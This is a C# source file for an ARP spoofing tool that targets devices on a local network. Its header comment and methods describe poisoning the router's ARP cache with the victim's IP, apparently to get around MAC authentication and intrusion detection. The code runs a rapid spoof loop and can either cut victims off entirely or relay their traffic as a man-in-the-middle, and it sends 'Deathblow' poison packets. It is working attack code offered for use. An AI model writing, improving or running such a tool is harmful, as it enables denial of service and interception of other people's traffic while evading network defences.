using System.Collections.Concurrent;
using PacketDotNet;
using SharpPcap;
using System.Net.NetworkInformation;
using MyNet.Helpers;
using MyNet.Models;

namespace MyNet.Core
{
    /// <summary>
    /// Manages ARP spoofing for one or more target devices.
    ///
    /// Theory of operation — THE PARASITE EVASION (Asymmetric IP Hijack)
    /// ───────────────────────────────────────────────────────
    ///   Since the Router's AP enforces strict MAC authentication against unauthenticated Fake MACs,
    ///   and hardware DPI bans ANY packet claiming to be the Gateway, we must execute the absolute
    ///   final form of Layer-2 manipulation: The Parasite Evasion.
    ///
    ///   We legally claim the Victim's IP address using our OWN fully authenticated PC MAC address!
    ///   By sending a targeted ARP Request to the Router stating "The Victim IP is at My PC MAC",
    ///   we bypass all unauthenticated MAC drops. The Router immediately overwrites the Victim's 
    ///   route in its cache. 
    ///
    ///   Because we NEVER spoof the Gateway IP, the IDS firewall mathematically cannot ban us.
    ///   All download traffic for the Victim is natively routed to our PC, where our NDIS Silencer
    ///   instantly vaporizes it. The Victim's TCP streams timeout in 3 seconds, resulting in a 
    ///   permanent, flawless absolute disconnect.
    public class ArpSpoofer : IDisposable
    {
        // ----------------------------------------------------------------
        //  Fields
        // ----------------------------------------------------------------
        private readonly AdapterInfo _adapter;
        private ILiveDevice? _sendDevice;

        // Tracks blocked devices. Key: Target IP, Value: Target MAC
        private readonly ConcurrentDictionary<string, string> _targetedDevices = new();
        private readonly ConcurrentDictionary<string, CancellationTokenSource> _targets = new();
        private readonly object _lock = new();

        public bool IsForwardingEnabled { get; set; } = true;

        public event Action<string>? LogMessage;

        // ----------------------------------------------------------------
        //  Constructor
        // ----------------------------------------------------------------
        public ArpSpoofer(AdapterInfo adapter) => _adapter = adapter;

        // ----------------------------------------------------------------
        //  Device lifecycle
        // ----------------------------------------------------------------
        private void EnsureDeviceOpen()
        {
            if (_sendDevice != null) return;

            var devices = CaptureDeviceList.Instance;
            foreach (var d in devices)
            {
                if (d.Name.Contains(_adapter.Name, StringComparison.OrdinalIgnoreCase))
                {
                    _sendDevice = d;
                    break;
                }
            }

            if (_sendDevice == null)
                throw new InvalidOperationException("Could not find Npcap device.");

            // Open in Promiscuous mode to ensure we hear the victim's broadcast ARP requests
            try { _sendDevice.Open(DeviceModes.Promiscuous, 100); } catch { /* Already open */ }
            _sendDevice.Filter = "arp";
            _sendDevice.OnPacketArrival += OnPacketArrival;
            _sendDevice.StartCapture();
        }

        // ----------------------------------------------------------------
        //  Public: Add / Remove targets
        // ----------------------------------------------------------------

        public void AddTarget(NetworkDevice device, string gatewayMac)
        {
            lock (_lock)
            {
                if (_targets.ContainsKey(device.IpAddress)) return;

                try { EnsureDeviceOpen(); }
                catch (Exception ex)
                {
                    LogMessage?.Invoke($"[ERROR] {ex.Message}");
                    return;
                }

                var cts = new CancellationTokenSource();
                _targets[device.IpAddress] = cts;
                _targetedDevices[device.IpAddress] = device.MacAddress;

                _ = Task.Run(() => SpoofLoopAsync(device, gatewayMac, cts.Token), cts.Token);
                LogMessage?.Invoke($"[+] Blocking {device.IpAddress} — Parasite Evasion active.");
            }
        }

        public void RemoveTarget(NetworkDevice device, string gatewayMac)
        {
            lock (_lock)
            {
                if (!_targets.TryGetValue(device.IpAddress, out var cts)) return;

                cts.Cancel();
                _targets.Remove(device.IpAddress, out _);
                _targetedDevices.Remove(device.IpAddress, out _);

                try
                {
                    RestoreArp(device.IpAddress, device.MacAddress, gatewayMac);
                    LogMessage?.Invoke($"[-] Unblocked {device.IpAddress} — ARP restored.");
                }
                catch (Exception ex)
                {
                    LogMessage?.Invoke($"[WARN] Restore ARP failed for {device.IpAddress}: {ex.Message}");
                }
            }
        }

        public bool IsTargeted(string ip)
        {
            return _targets.ContainsKey(ip);
        }

        // ----------------------------------------------------------------
        //  Spoofing loop (High Frequency)
        // ----------------------------------------------------------------
        private async Task SpoofLoopAsync(NetworkDevice device, string gatewayMac, CancellationToken ct)
        {
            // Rapid-fire sequence to override any Data-Plane learning from the Victim.
            const int intervalMs = 250;

            while (!ct.IsCancellationRequested)
            {
                try
                {
                    ExecuteParasiteEviction(device.IpAddress, device.MacAddress, gatewayMac);
                    
                    if (IsForwardingEnabled)
                    {
                        // Bidirectional: Tell victim we are the Gateway
                        var toVictim = ArpPacketBuilder.BuildArpReply(
                            ourMac: _adapter.MacAddress,
                            spoofedIp: _adapter.GatewayIp,
                            targetMac: device.MacAddress,
                            targetIp:  device.IpAddress);
                        _sendDevice?.SendPacket(toVictim);
                    }

                    await Task.Delay(intervalMs, ct);
                }
                catch (OperationCanceledException) { break; }
                catch (Exception ex)
                {
                    LogMessage?.Invoke($"[ERROR] Spoof loop {device.IpAddress}: {ex.Message}");
                    await Task.Delay(500, ct);
                }
            }
        }

        // ----------------------------------------------------------------
        //  Packet Inspection
        // ----------------------------------------------------------------
        private void OnPacketArrival(object sender, PacketCapture e)
        {
            if (!IsForwardingEnabled || _sendDevice == null) return;

            var rawPacket = e.GetPacket();
            var packet = Packet.ParsePacket(rawPacket.LinkLayerType, rawPacket.Data);
            var eth = packet.Extract<EthernetPacket>();
            if (eth == null) return;

            // 1. Victim -> Gateway (Forwarding)
            // If the source is a targeted device and the destination is OUR MAC
            if (_targetedDevices.Values.Contains(eth.SourceHardwareAddress.ToString()))
            {
                // Re-route to real Gateway MAC
                eth.DestinationHardwareAddress = PhysicalAddress.Parse(_adapter.GatewayMac.Replace(":", "-"));
                _sendDevice.SendPacket(packet);
            }
            // 2. Gateway -> Victim (Forwarding)
            // If the destination IP is one of our targets and the Dest MAC is OUR MAC
            else if (eth.DestinationHardwareAddress.ToString() == _adapter.MacAddress.Replace(":", ""))
            {
                var ip = packet.Extract<IPPacket>();
                if (ip != null && _targetedDevices.TryGetValue(ip.DestinationAddress.ToString(), out var victimMac))
                {
                    eth.DestinationHardwareAddress = PhysicalAddress.Parse(victimMac.Replace(":", "-"));
                    _sendDevice.SendPacket(packet);
                }
            }
        }

        // ----------------------------------------------------------------
        //  Poisoning & Restoration Logic
        // ----------------------------------------------------------------

        private void ExecuteParasiteEviction(string victimIp, string victimMac, string gatewayMac)
        {
            if (_sendDevice == null) return;

            // The Parasite Evasion: Asymmetric Router-Side Poisoning
            // We tell the Router: "The Victim's IP is actually at MY PC MAC"
            // We MUST use ArpOperation.Request because Linux Routers (arp_accept=0) ignore unsolicited Replies!
            // When the Router gets this Request, it updates its cache AND answers us.
            var parasitePoison = ArpPacketBuilder.BuildParasiteArpRequest(
                ourMac: _adapter.MacAddress,
                victimIp: victimIp,
                routerMac: gatewayMac,
                routerIp: _adapter.GatewayIp);

            _sendDevice.SendPacket(parasitePoison);
        }

        private void RestoreArp(string victimIp, string victimMac, string gatewayMac)
        {
            if (_sendDevice == null) return;

            // Tell victim: "Gateway IP is at REAL gateway MAC"
            var toVictim = ArpPacketBuilder.BuildArpRestore(
                realSenderMac: gatewayMac,
                realSenderIp:  _adapter.GatewayIp,
                targetMac:     victimMac,
                targetIp:      victimIp);

            // Send multiple times to ensure the victim's cache updates
            for (int i = 0; i < 5; i++)
            {
                _sendDevice.SendPacket(toVictim);
                Thread.Sleep(50);
            }
        }

        public void PulseReset(NetworkDevice device, string gatewayMac)
        {
            // Briefly disconnect to force OS network-check (Captive Portal trigger)
            lock (_lock)
            {
                if (!_targets.TryGetValue(device.IpAddress, out var cts)) return;
                
                cts.Cancel();
                _targets.Remove(device.IpAddress, out _);

                // Send 3 'Deathblow' packets to clear caches
                var deathblow = ArpPacketBuilder.BuildGhostPoison("DE:AD:BE:EF:CA:FE", _adapter.GatewayIp, device.MacAddress, device.IpAddress);
                for(int i=0; i<3; i++) _sendDevice?.SendPacket(deathblow);
                
                // Wait 1.5s for the OS to realize it's 'Off'
                Task.Delay(1500).ContinueWith(_ => {
                    // Restore as Shadow/MITM
                    AddTarget(device, gatewayMac);
                });
            }
        }
        
        public void StopAll(string gatewayMac)
        {
            lock (_lock)
            {
                foreach (var cts in _targets.Values) cts.Cancel();
                _targets.Clear();
                _targetedDevices.Clear();
            }
            LogMessage?.Invoke("[*] All spoofing stopped. Devices will self-heal shortly.");
        }

        public void Dispose()
        {
            foreach (var cts in _targets.Values) cts.Cancel();
            _targets.Clear();
            _targetedDevices.Clear();

            if (_sendDevice != null)
            {
                _sendDevice.OnPacketArrival -= OnPacketArrival;
                _sendDevice = null;
            }
        }
    }
}